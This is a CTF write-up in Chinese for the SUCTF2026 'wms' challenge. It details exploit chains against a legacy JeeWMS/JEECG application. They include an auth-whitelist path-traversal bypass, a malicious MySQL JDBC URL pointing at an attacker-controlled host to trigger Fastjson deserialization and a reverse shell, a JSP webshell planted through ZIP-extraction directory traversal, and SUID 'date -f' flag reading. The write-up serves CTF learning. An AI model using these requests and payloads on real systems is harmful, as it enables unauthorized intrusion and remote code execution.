# SUCTF2026-wms

## 题目简述

题目基于一套旧版 JeeWMS/JEECG 应用。官方预期链利用 `AuthInterceptor` 的包含式白名单绕过后台鉴权，再调用动态数据源的连接测试功能，把 JDBC URL 指向攻击者控制的伪 MySQL 服务。环境内的 MySQL Connector/J 5.1.27 支持危险的 `autoDeserialize` 行为，classpath 又包含 Fastjson 1.2.6，因此恶意服务端响应可以触发反序列化 gadget，得到 `wms` 用户命令执行。

容器以非 root 用户运行 Tomcat，flag 位于根目录下随机目录、随机文件名中且权限为 `0400`；不过 Dockerfile 给 `/bin/date` 设置了 SUID，最终可用它读取 flag 内容。

总 WP 还给出一条完全不同、同样能由题目 class 文件验证的替代链：`/rest/*` 正则白名单允许匿名调用 `CgformTemplateController`，再利用用户可控的模板解压目标目录把 JSP 写进 Web 根目录。下面以官方 JDBC 链为主，把模板链作为替代方案单独说明。

## 解题过程

### 1. 确认版本与攻击面

展开后的 `WEB-INF/lib` 可以直接确认关键依赖：

```text
mysql-connector-java-5.1.27.jar
fastjson-1.2.6.jar
spring-webmvc-4.0.9.RELEASE.jar
```

后台的 `DynamicDataSourceController` 暴露 `testConnection` 方法，接收 `DynamicDataSourceEntity` 中的 `driverClass`、`url`、`dbUser`、`dbPassword` 等字段，然后按用户给出的 JDBC 配置尝试连接。这里没有对危险 MySQL 参数做过滤。

真正阻挡匿名访问的是 `AuthInterceptor`。它先调用 `ResourceUtil.getRequestPath(request)` 取得路径，再依次判断精确白名单、包含式白名单和登录会话。`spring-mvc.xml` 中的包含式白名单含有：

```xml
<property name="excludeContainUrls">
  <list>
    <value>systemController/showOrDownByurl.do</value>
    <value>wmsApiController.do</value>
  </list>
</property>
```

只要请求路径字符串包含其中任意片段，`moHuContain` 就直接返回 `true`，不会继续检查 session 或用户权限。

### 2. 通过路径规范化差异匿名访问后台控制器

构造路径时，把白名单片段放在前面，再使用 `../` 回到真正目标控制器：

```text
/jeewms/systemController/showOrDownByurl.do/../../dynamicDataSourceController.do?testConnection
```

拦截器看到的原始请求路径仍包含：

```text
systemController/showOrDownByurl.do
```

因而被包含式白名单放行；而 Servlet 容器/Spring 在路由阶段解析路径段后，实际命中：

```text
/dynamicDataSourceController.do?testConnection
```

这个绕过不需要登录 cookie。官方 WP 的抓包中带有多个旧 `JSESSIONID`，但它们不是成功条件，不应复制进利用脚本。

复现时要让 HTTP 客户端原样发送 `/../../`。某些高级 HTTP 库会在发包前自动规范化路径，此时应改用不会折叠路径的原始请求方式，并在代理中确认线上真正发送的 request-target。

### 3. 利用动态数据源连接测试

向绕过后的控制器提交表单：

```text
id=
dbKey=test
description=test
dbType=mysql
driverClass=com.mysql.jdbc.Driver
url=jdbc:mysql://ATTACKER:PORT/?detectCustomCollations=true&autoDeserialize=true&user=TOKEN
dbName=a
dbUser=a
dbPassword=a
```

其中最重要的三个 URL 参数是：

- `detectCustomCollations=true`：让旧驱动在握手后继续向服务端查询自定义 collation 信息，进入恶意 MySQL 服务所模拟的响应流程；
- `autoDeserialize=true`：允许 Connector/J 将服务端返回的特定二进制值当成 Java 序列化对象还原；
- `user=TOKEN`：官方使用的 `java-chains` MySQL 服务以该 token 选择已经生成的 payload，具体值由本地工具实例给出。

请求骨架如下，URL 作为表单值时必须进行百分号编码：

```http
POST /jeewms/systemController/showOrDownByurl.do/../../dynamicDataSourceController.do?testConnection HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

dbKey=test&dbType=mysql&driverClass=com.mysql.jdbc.Driver&url=<encoded-jdbc-url>&dbUser=a&dbPassword=a
```

攻击者一侧先用 `java-chains` 启动恶意 MySQL 协议服务，并选择与目标 JDK、Fastjson 1.2.6 classpath 兼容的命令执行 payload。它不是普通 MySQL 数据库：服务端要按 Connector/J 预期完成握手和查询响应，并在驱动会自动反序列化的位置返回 payload。

完整数据流为：

```text
未授权 HTTP 请求
  -> DynamicDataSourceController.testConnection
  -> com.mysql.jdbc.Driver.connect
  -> 连接攻击者伪 MySQL 服务
  -> 查询自定义 collation
  -> 服务端返回序列化对象
  -> Connector/J autoDeserialize
  -> Fastjson 1.2.6 gadget
  -> Runtime.exec / 反向 shell
```

若只看到连接失败，不应立刻判断鉴权绕过失效。应分别检查：请求是否真正命中 `testConnection`、目标能否主动连接恶意 MySQL 端口、token 是否对应当前 payload，以及伪服务返回的数据是否适配 Connector/J 5.1.27。

### 4. 利用 SUID `date` 读取随机 flag

Dockerfile 的关键逻辑是：

```dockerfile
RUN FLAG_DIR="<随机12字符>"; \
    FLAG_NAME="flag_<随机8字符>"; \
    mkdir -p "/${FLAG_DIR}"; \
    mv /tmp/flag "/${FLAG_DIR}/${FLAG_NAME}"; \
    chmod 400 "/${FLAG_DIR}/${FLAG_NAME}"; \
    chmod u+s /bin/date

USER wms
```

因此 RCE shell 不能直接 `cat` 该文件。先找出浅层随机路径：

```bash
find / -maxdepth 2 -name 'flag_*' 2>/dev/null
```

再让带 SUID 的 GNU `date` 把 flag 文件当作日期列表读取：

```bash
/bin/date -f '/随机目录/flag_随机名' 2>&1
```

flag 不是合法日期，`date` 的错误信息会原样包含无法解析的输入行，从而泄露内容。这一步利用的是程序的“解析错误回显”，不是修改系统时间。

官方仓库中的静态 flag 为：

```text
suctf{v3ry_e45y_uN4utHOrIZEd_rC3!_!aAA}
```

线上环境的路径和 flag 内容可能动态生成，应以实际输出为准。

### 5. 替代链：匿名模板上传与解压目标目录穿越

`AuthInterceptor.preHandle` 在包含式白名单之前还有一条直接放行规则：

```java
if (requestPath.matches("^rest/[a-zA-Z0-9_/]+$")) {
    return true;
}
```

因此不带 query string 的路径：

```text
/jeewms/rest/cgformTemplateController
```

会被匿名放行。`CgformTemplateController` 的多个方法共用这个路径，只通过 `@RequestMapping(params={...})` 区分。Spring 的 request parameter 不限于 URL query，表单 body 中的参数也参与方法匹配，所以可以保持 URL 中没有 `?`，把 `uploadZip` 或 `doAdd` 放进 POST body。

第一步发送 multipart 请求，在 body 中加入 `uploadZip` 参数并上传一个只包含 JSP 的 ZIP。`uploadZip` 把文件保存在：

```text
<uploadBase>/temp/zip_<session-id>.zip
```

响应 JSON 的 `obj` 返回实际临时文件名，后续不能自行猜测。

第二步以表单调用 `doAdd`：

```text
doAdd=
templateName=<任意唯一名>
templateCode=../../../../
templateZipName=<uploadZip 返回的文件名>
templateType=default
templateShare=Y
```

`doAdd` 的目标目录直接由用户字段拼接：

```java
String basePath = getUploadBasePath(request);
File templateDir = new File(
    basePath + File.separator + template.getTemplateCode()
);
removeZipFile(
    basePath + File.separator + "temp" + File.separator
        + template.getTemplateZipName(),
    templateDir.getAbsolutePath()
);
```

当前部署中的 `basePath` 为：

```text
/usr/local/tomcat/webapps/jeewms/WEB-INF/classes/online/template
```

拼接 `../../../../` 后规范化到：

```text
/usr/local/tomcat/webapps/jeewms
```

也就是应用 Web 根目录。这里决定性漏洞是“解压目标目录由 `templateCode` 路径穿越控制”，并不要求 ZIP entry 自己带 `../`；恶意 ZIP 只需在根部包含随机命名 JSP。

JSP 可以读取 `cmd` 参数并用 `/bin/sh -c` 执行，再按上一节使用 `find` 与 SUID `date` 取 flag。请求顺序为：

```text
POST /rest/cgformTemplateController
  body 参数 uploadZip + JSP ZIP
  -> 得到 tempZipName

POST /rest/cgformTemplateController
  body 参数 doAdd + templateCode=../../../../
  -> JSP 解压到 Web 根目录

GET /jeewms/<随机名>.jsp?cmd=...
  -> 命令执行
```

这条链由总 WP 给出，并能从附件 class 的实际方法和路径计算中验证；它不是官方单题 WP 的 JDBC 主线，二者应作为独立利用方案理解，不能把 ZIP 写 JSP 描述成 MySQL 反序列化的一个步骤。

## 方法总结

官方解法由两个信任边界错误串联：鉴权逻辑仅做“路径包含白名单字符串”的判断，而路由层会把同一 request-target 规范化到另一个控制器；动态数据源功能又把完全可控的旧版 MySQL JDBC URL 交给驱动，允许恶意服务端通过 `autoDeserialize` 触发 classpath gadget。

替代模板链则利用另一条 `/rest/*` 正则白名单，并借 Spring 的 body 参数方法分发保持 URL 无 query，最后通过 `templateCode` 控制解压目标。无论从哪条链取得 `wms` shell，都还要尊重容器的权限边界：随机 flag 是 root-only，真正的读取原语是 SUID `date -f` 的错误回显。
